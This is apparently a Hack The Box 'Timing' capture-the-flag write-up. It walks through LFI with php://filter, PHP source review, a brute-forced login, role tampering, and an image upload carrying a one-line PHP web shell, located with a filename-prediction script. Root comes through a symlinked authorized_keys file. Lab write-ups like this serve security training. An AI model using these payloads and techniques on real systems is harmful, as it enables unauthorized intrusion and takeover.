# Hack The Box - Timing
![home](https://user-images.githubusercontent.com/36403473/167136582-1b224c83-8ce5-4772-8766-304e5876294c.jpg)

### Brief of attacks :

1-LFI

2-source code review (php)

3-Unrestricted File Upload

4-Symbolic link




#### 1-Nmap

```
nmap -sC -sV  -P 10.10.11.135
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 13:06 GMT
Nmap scan report for Timing.htb (10.10.11.135)
Host is up (0.49s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

 let's explore port `80` ,it is login page. 

![1](https://user-images.githubusercontent.com/36403473/167138043-200b10a8-6468-408b-a3ee-f84dd168432b.png)

## user flag

i tried `sql injection` but didn't work, so let's explore directories ,i prefere `dirsearch` tool

```
[13:38:41] 200 -    0B  - /image.php
[13:38:48] 200 -    5KB - /login.php

```

`image.php`

I use `WFUZZ` to find if there is any parameter and i found `img` parameter.

`wfuzz -w anyworldist -hh 0 http://timing.htb/image.php?FUZZ=../etc/passwd`

#### note :
To find `img` parameter i want to make application tell that me  right, you trying to hack me.

another tools :
```
param-miner

Arjun
```
### LFI:

![2](https://user-images.githubusercontent.com/36403473/170888075-b55b6abb-5ac3-4d23-802a-5c11560b312d.png)

very good it's seem way to `attack` let's try some injections (Sql injection -LFI-command injection)

using `PHP wrappers`


finally i found its `LFI`, i used `php://filter/convert.base64-encode` LFI technique to get `etc/passwd`

you can find ways to detect `LFI` here
[here](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

![3](https://user-images.githubusercontent.com/36403473/170888290-c9328511-d71a-4377-986a-7306fb7d866c.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```
#### notice
`aaron:x:1000:1000:aaron:/home/aaron:/bin/bash`

let's read`login.php` after `base64` decode

```
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}

include "db_conn.php";

if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}


if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}
?>
<?php
if (isset($errorMessage)) {

    ?>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-10 col-md-offset-1">
                <div class="alert alert-danger alert-dismissible fade in text-center" role="alert"><strong>

                        <?php echo $errorMessage; ?>

                </div>
            </div>
        </div>
    </div>
    <?php
}
?>
    <link rel="stylesheet" href="./css/login.css">

    <div class="wrapper fadeInDown">
        <div id="formContent">
            <div class="fadeIn first" style="padding: 20px">
                <img src="./images/user-icon.png" width="100" height="100"/>
            </div>

            <form action="?login=true" method="POST">

                <input type="text" id="login" class="fadeIn second" name="user" placeholder="login">

                <input type="text" id="password" class="fadeIn third" name="password" placeholder="password">

                <input type="submit" class="fadeIn fourth" value="Log In">

            </form>


            <!-- todo -->
            <div id="formFooter">
                <a class="underlineHover" href="#">Forgot Password?</a>
            </div>

        </div>
    </div>


<?php
include "footer.php";

```

i found `db_conn.php` and many pages ,i got all of them let's start new chapter.

![4](https://user-images.githubusercontent.com/36403473/170888997-b67eb05e-d040-4b89-b562-56e37e122212.png)


### code review:

### login.php:

```
if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}

```
From the first look this code seems to have `sql injection` but after search with my friend `Yasser Elsnbary` we found that its not sql injection

you can check it from
[here](https://stackoverflow.com/questions/14589407/what-does-a-colon-before-a-literal-in-an-sql-statement-mean)


```
Prepared statements are very useful against SQL injections, because parameter values, which are transmitted later using a different protocol, need not be correctly escaped. If the original statement template is not derived from external input, SQL injection cannot occur.

```


its seem that we have user that have high privilege over other users it may admin user but first we need to login.

i only have a user `aaron` but i dont have his passowrd and no way to `sql_injection`

i found this passowrd `4_V3Ry_l0000n9_p422w0rd` in `db_conn.php` but doesn't work.

so the last solution to find `aaron` password is to bruteforce we may found it.

using `rockyou` wordlist it was easy to find ,so our username& password  [`aaron`-`aaron`]


![5](https://user-images.githubusercontent.com/36403473/171068633-de00d6bd-5466-485d-b70b-5f9ec013b3f9.png)


After logging, i realized that i am in right corner i am `user 2` so i need to increase my privilege.

lets open `burpsuite`

in `Edit profile` page 

![6](https://user-images.githubusercontent.com/36403473/171068968-87e29291-36cd-4f65-a3b6-774f828eb612.png)


From `admin_auth_check.php` 
```
include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
```
lets try to manipulate this  by setting `role=1`,so let's add role parameter and see what will happen.

![7](https://user-images.githubusercontent.com/36403473/171070042-beb3d3ca-b809-4668-ae81-5c843ee5f252.png)

`role` parameter changed in `json response` & `admin panel` tab appeared.

![8](https://user-images.githubusercontent.com/36403473/171071990-835005a6-117c-4272-aeeb-83af822d8397.png)

lets check `avatar_uploader.php` :

```
<?php

include_once "header.php";

include_once "admin_auth_check.php";
?>

<script src="js/avatar_uploader.js"></script>

<style>
    .bg {
        padding: 30px;
        /* Full height */
        height: 100%;

        /* Center and scale the image nicely */
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
    }
</style>

<div class="bg" id="main">

    <div class="alert alert-success" id="alert-uploaded-success" style="display: none">

    </div>

    <div class="alert alert-danger" id="alert-uploaded-error" style="display: none">

    </div>

    <div class="container bootstrap snippets bootdey" style="margin-bottom: 150px">
        <h1 class="text-primary"><span class="glyphicon glyphicon-user"></span>Upload avatar</h1>
        <hr>


        <form class="form-inline" action="upload.php" method="post" enctype="multipart/form-data">
            <div class="form-group mb-2">
                <input type="file" name="fileToUpload" class="form-control" id="fileToUpload">
            </div>

            <button type="button" onclick="doUpload()" class="btn btn-primary">
                Upload Image
            </button>

        </form>

    </div>
</div>

<?php
include_once "footer.php";
?>

```

`avatar_uploader.js`:

```
$(document).ready(function () {
    document.getElementById("main").style.backgroundImage = "url('/image.php?img=images/background.jpg'"
});

function doUpload() {

    if (document.getElementById("fileToUpload").files.length == 0) {
        document.getElementById("alert-uploaded-error").style.display = "block"
        document.getElementById("alert-uploaded-success").style.display = "none"
        document.getElementById("alert-uploaded-error").textContent = "No file selected!"
    } else {

        let file = document.getElementById("fileToUpload").files[0];  // file from input
        let xmlHttpRequest = new XMLHttpRequest();
        xmlHttpRequest.onreadystatechange = function () {
            if (xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200) {


                if (xmlHttpRequest.responseText.includes("Error:")) {
                    document.getElementById("alert-uploaded-error").style.display = "block"
                    document.getElementById("alert-uploaded-success").style.display = "none"
                    document.getElementById("alert-uploaded-error").textContent = xmlHttpRequest.responseText;
                } else {
                    document.getElementById("alert-uploaded-error").style.display = "none"
                    document.getElementById("alert-uploaded-success").textContent = xmlHttpRequest.responseText;
                    document.getElementById("alert-uploaded-success").style.display = "block"
                }

            }
        };
        let formData = new FormData();

        formData.append("fileToUpload", file);
        xmlHttpRequest.open("POST", 'upload.php');
        xmlHttpRequest.send(formData);
    }
}

```

`upload.php`:
```
<?php
#include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>

```
#### analyzing(upload.php):

1- we can upload `jpg` file 

2- upload_dir = `"images/uploads/"`

3- this code change the name of photo from this lines 

```
$file_hash = uniqid()
md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"])
```

so we need to create simple script that change name like this sequence :

`md5(uniqid()+time())+filename`

#### note that

`uniqid()`-> generates a unique ID based on the microtime (the current time in microseconds).

The generated ID from this function does not guarantee uniqueness of the return value

`time()`-> function returns the current time in the number of seconds since the Unix Epoch (January 1 1970 00:00:00 GMT).

so the problem that the new name of photo can be detected.


i generate php code that help me to detect new photo name :

```
<?PHP
#!/usr/bin/php
function uniqid_Test()
{
	$i=0;
	while ($i<80)
	{
		$hash_name=uniqid(); // return time in microsecond in hex format 
		//convert (hash_name ) to decimal value
		$Decimal_value =hexdec($hash_name); 
		$time_seconds=$Decimal_value*0.000001;

		#echo "uniqid (microseconds) = ".$hash_name."\n";

		#echo "(uniqid)-> Decimal value (microseconds)= ".$Decimal_value."\n";

		#echo "(uniqid)-> Decimal value (Seconds) = ".$time_seconds."\n";
		
		// from second to microsecond 
		$converted_id=($time_seconds+$i)/0.000001;
		
		$converted_id_hex=dechex($converted_id);

		echo date("D M j G:i:s T Y") ." -> ". md5($converted_id_hex.time())."\n";

		sleep(1);

		$i=$i+1;
	}

}
function time_Test()
{ 
	while (true)
	{
		echo date("G:i:s")." -> ".md5(uniqid().time())."pts.jpg"."\n";

		sleep(1);
	
	}


}

#uniqid_Test()
#time_Test()

	while (true)
	{
		echo date("G:i:s")." -> ". md5(uniqid().time()) . '_'. "pk.jpg";
		sleep(1);
		echo "\n";

		
	
	}

?>
```
so lets upload our shell file and run our script.

we need php code inside `jpg` file 

i generate  `pk.jpg` file and put this php code inside it 
`<?php system($_GET[cmd]);?> `

`http://timing.htb/image.php?img=images/uploads/e8fd9fafa2388864352241933bcac132_pk.jpg&cmd=ls`

```
admin_auth_check.php
auth_check.php
avatar_uploader.php
css
db_conn.php
footer.php
header.php
image.php
images
index.php
js
login.php
logout.php

```
in `/opt` directory i found `source-files-backup.zip`, i downloaded and explore it .

in `db_conn.php`
```
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
````
i tried to login with `4_V3Ry_l0000n9_p422w0rd` via `ssh` but it doesn't work,so i should dig more.

i found another password  in git logs folders by using `git log -p` command lets try this password
if you dont know how to use `git logs ` check this [this](https://git-scm.com/docs/git-log)

![9](https://user-images.githubusercontent.com/36403473/171456400-9eb77534-274a-4510-8f43-3a96f1f7c63f.png)

![10](https://user-images.githubusercontent.com/36403473/171457875-772b477b-2a34-4271-bfdb-b819410a450f.png)

### Root flag

by checking sudo 

```
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils


```
lets run this binary 

![12](https://user-images.githubusercontent.com/36403473/171492490-f0907132-dc5d-485d-a5a7-a680f7eba024.png)

its a binary you can download file to machine with `root` permissions.
for trying, i downloaded test python file on the server.

...\Exploit.....
In fact, I've encountered such an idea before

### Symbolic link:
is a file-system object that points to another file system object. The object being pointed to is called the target. 
 
so i will make Symbolic link for ssh key and overwrite authorized_key (Generate SSH Keys use `ssh-keygen` command).

i will use this binary to upload ssh key to server but it should name the same name of symbol linked to overwrite.
`ln -s source_file symbolic_link

![13](https://user-images.githubusercontent.com/36403473/171502770-4c458c06-e13b-419a-bde4-8807f296f4c2.png)
![14](https://user-images.githubusercontent.com/36403473/171502771-3ce32a8b-c1c4-49ae-b198-046c512cd978.png)
i
![16](https://user-images.githubusercontent.com/36403473/171504297-9310e428-aedd-4925-815e-e9809e218f75.png)



